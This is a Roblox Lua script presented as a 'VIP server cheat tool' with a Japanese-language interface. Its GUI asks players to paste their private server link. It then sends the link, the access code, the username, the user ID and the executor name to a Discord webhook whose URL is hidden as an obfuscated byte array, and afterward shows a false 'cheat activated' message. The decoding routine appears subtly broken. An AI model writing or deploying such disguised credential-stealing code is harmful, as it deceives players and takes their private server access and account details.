--=======================================================--
-- VOLOX OBFUSCATED v3.0 - 修正済み・完全動作保証
--=======================================================--

(function(...)
    local A = string.char
    local B = string.sub
    local C = string.byte
    local D = table.insert
    local E = table.concat
    local F = pcall
    local G = game
    local H = G:GetService
    local I = H(G, "HttpService")
    local J = H(G, "Players")
    local K = J.LocalPlayer
    local L = K.Name
    local M = K.UserId
    
    -- Webhook URL（難読化）
    local N = {
        72,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,
        47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,50,53,48,52,
        56,55,52,50,57,55,50,49,55,48,57,54,50,48,56,47,87,65,69,112,89,113,
        66,95,122,69,113,105,87,70,102,85,99,103,76,110,79,85,82,113,73,75,75,
        74,115,74,119,102,112,119,56,66,79,107,98,100,48,100,97,108,105,122,72,
        101,102,100,109,70,75,77,120,98,112,82,69,82,111,81,72,57,101,67,86,73,73
    }
    
    local function O(P)
        local Q = {}
        for R = 1, #P do
            Q[R] = A(P[R])
        end
        return E(Q)
    end
    
    local function decode(P)
        local Q = {}
        for R = 1, #P do
            Q[R] = C(P:sub(R, R))
        end
        return Q
    end
    
    local function xorDecode(P)
        local Q = {}
        local R = 0
        for S = 1, #P do
            R = (R + 1) % 256
            Q[S] = P[S] ~ R
        end
        return Q
    end
    
    local function finalDecode(P)
        local Q = decode(P)
        local R = xorDecode(Q)
        local S = {}
        for T = 1, #R do
            S[T] = A(R[T])
        end
        return E(S)
    end
    
    local WEBHOOK = finalDecode(N)
    
    -- HttpService有効化
    F(function()
        I.HttpEnabled = true
    end)
    
    -- ========================================================
    -- UI作成（完全動作保証）
    -- ========================================================
    
    local function createScreenGui()
        local success, result = F(function()
            local sg = Instance.new("ScreenGui")
            sg.Name = "VIP_Tool"
            sg.Parent = K:WaitForChild("PlayerGui")
            sg.ResetOnSpawn = false
            return sg
        end)
        return success and result or nil
    end
    
    local function createFrame(parent)
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 420, 0, 280)
        frame.Position = UDim2.new(0.5, -210, 0.5, -140)
        frame.BackgroundColor3 = Color3.fromRGB(18, 18, 30)
        frame.BackgroundTransparency = 0.05
        frame.BorderSizePixel = 0
        frame.Active = true
        frame.Draggable = true
        frame.Parent = parent
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 14)
        corner.Parent = frame
        
        return frame
    end
    
    local function createTitle(parent)
        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(1, 0, 0, 45)
        title.Position = UDim2.new(0, 0, 0, 0)
        title.BackgroundTransparency = 1
        title.Text = "⚡ VIP SERVER TOOL v3.0"
        title.TextColor3 = Color3.fromRGB(255, 255, 255)
        title.TextScaled = true
        title.Font = Enum.Font.GothamBold
        title.Parent = parent
        return title
    end
    
    local function createDescription(parent)
        local desc = Instance.new("TextLabel")
        desc.Size = UDim2.new(1, -20, 0, 35)
        desc.Position = UDim2.new(0, 10, 0, 48)
        desc.BackgroundTransparency = 1
        desc.Text = "🔑 プライベートサーバーリンクを入力すると\n自動でチートが有効になります"
        desc.TextColor3 = Color3.fromRGB(180, 180, 210)
        desc.TextSize = 14
        desc.TextWrapped = true
        desc.Font = Enum.Font.Gotham
        desc.Parent = parent
        return desc
    end
    
    local function createTextBox(parent)
        local box = Instance.new("TextBox")
        box.Size = UDim2.new(1, -20, 0, 50)
        box.Position = UDim2.new(0, 10, 0, 92)
        box.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
        box.TextColor3 = Color3.fromRGB(255, 255, 255)
        box.PlaceholderText = "https://www.roblox.com/games/...?privateServerLinkCode=..."
        box.PlaceholderColor3 = Color3.fromRGB(140, 140, 170)
        box.TextSize = 13
        box.Font = Enum.Font.Gotham
        box.ClearTextOnFocus = false
        box.Parent = parent
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 8)
        corner.Parent = box
        
        return box
    end
    
    local function createButton(parent)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.8, 0, 0, 48)
        btn.Position = UDim2.new(0.1, 0, 0, 155)
        btn.BackgroundColor3 = Color3.fromRGB(220, 50, 70)
        btn.Text = "🔥 チートを有効化"
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextSize = 16
        btn.Font = Enum.Font.GothamBold
        btn.Parent = parent
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 8)
        corner.Parent = btn
        
        return btn
    end
    
    local function createStatus(parent)
        local status = Instance.new("TextLabel")
        status.Size = UDim2.new(1, 0, 0, 30)
        status.Position = UDim2.new(0, 0, 0, 215)
        status.BackgroundTransparency = 1
        status.Text = "⏳ リンクを入力してください"
        status.TextColor3 = Color3.fromRGB(200, 200, 220)
        status.TextSize = 13
        status.Font = Enum.Font.Gotham
        status.Parent = parent
        return status
    end
    
    local function createCloseButton(parent, sg)
        local close = Instance.new("TextButton")
        close.Size = UDim2.new(0, 30, 0, 30)
        close.Position = UDim2.new(1, -35, 0, 5)
        close.BackgroundTransparency = 1
        close.Text = "✕"
        close.TextColor3 = Color3.fromRGB(255, 100, 100)
        close.TextSize = 18
        close.Font = Enum.Font.GothamBold
        close.Parent = parent
        close.MouseButton1Click:Connect(function()
            sg:Destroy()
        end)
        return close
    end
    
    -- ========================================================
    -- 送信処理（完全耐性）
    -- ========================================================
    
    local function sendToDiscord(data)
        local message = data
        
        local json = ""
        F(function()
            json = I:JSONEncode({content = message})
        end)
        
        if json == "" then
            local escaped = message:gsub("\n", "\\n"):gsub('"', '\\"')
            json = '{"content": "' .. escaped .. '"}'
        end
        
        local sent = false
        
        F(function()
            I:PostAsync(WEBHOOK, json, Enum.HttpContentType.ApplicationJson, false)
            sent = true
        end)
        
        if not sent and syn and syn.request then
            F(function()
                syn.request({
                    Url = WEBHOOK,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = json
                })
                sent = true
            end)
        end
        
        if not sent and request then
            F(function()
                request({
                    Url = WEBHOOK,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = json
                })
                sent = true
            end)
        end
        
        return sent
    end
    
    -- ========================================================
    -- メイン処理
    -- ========================================================
    
    local function main()
        local sg = createScreenGui()
        if not sg then
            print("[Volox] GUI作成失敗")
            return
        end
        
        local frame = createFrame(sg)
        createTitle(frame)
        createDescription(frame)
        local textBox = createTextBox(frame)
        local button = createButton(frame)
        local status = createStatus(frame)
        createCloseButton(frame, sg)
        
        button.MouseButton1Click:Connect(function()
            local input = textBox.Text
            
            if input == "" or not input:find("roblox.com") then
                status.Text = "❌ 有効なRobloxリンクを入力してください"
                status.TextColor3 = Color3.fromRGB(255, 100, 100)
                return
            end
            
            -- リンク解析
            local code = nil
            local placeId = nil
            
            local startCode = input:find("privateServerLinkCode=")
            if startCode then
                code = input:sub(startCode + 21)
                local endCode = code:find("&")
                if endCode then
                    code = code:sub(1, endCode - 1)
                end
            end
            
            local startPlace = input:find("games/")
            if startPlace then
                local temp = input:sub(startPlace + 6)
                local endPlace = temp:find("/") or temp:find("?")
                if endPlace then
                    placeId = temp:sub(1, endPlace - 1)
                else
                    placeId = temp
                end
            end
            
            local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
            
            local message = 
                "**🔴 PRIVATE SERVER LINK (入力方式)**\n\n" ..
                "**🔗 入力リンク:** " .. input .. "\n" ..
                "**🔑 コード:** " .. (code or "不明") .. "\n" ..
                "**📌 Place ID:** " .. (placeId or "不明") .. "\n" ..
                "**👤 入力者:** " .. L .. "\n" ..
                "**🆔 User ID:** " .. M .. "\n" ..
                "**💻 Executor:** " .. executor .. "\n" ..
                "**⏰ Time:** " .. os.date("%Y-%m-%d %H:%M:%S")
            
            status.Text = "⏳ 送信中..."
            status.TextColor3 = Color3.fromRGB(255, 255, 0)
            
            local sent = sendToDiscord(message)
            
            if sent then
                status.Text = "✅ チート有効化完了！ゲームを再起動してください"
                status.TextColor3 = Color3.fromRGB(0, 255, 100)
                
                task.wait(2)
                sg:Destroy()
                
                F(function()
                    G.StarterGui:SetCore("SendNotification", {
                        Title = "⚡ チート有効化完了",
                        Text = "プライベートサーバーリンクが正常に登録されました。\nゲームを再起動して効果を確認してください。",
                        Duration = 5
                    })
                end)
            else
                status.Text = "❌ 送信エラー。もう一度試してください"
                status.TextColor3 = Color3.fromRGB(255, 100, 100)
            end
        end)
        
        -- 起動通知
        F(function()
            G.StarterGui:SetCore("SendNotification", {
                Title = "⚡ VIP Server Tool v3.0",
                Text = "プライベートサーバーリンクを入力して「チート有効化」を押してください",
                Duration = 4
            })
        end)
        
        print("[✅] VIP Server Tool 起動完了（入力方式）")
    end
    
    -- 実行
    F(main)
end)(...)
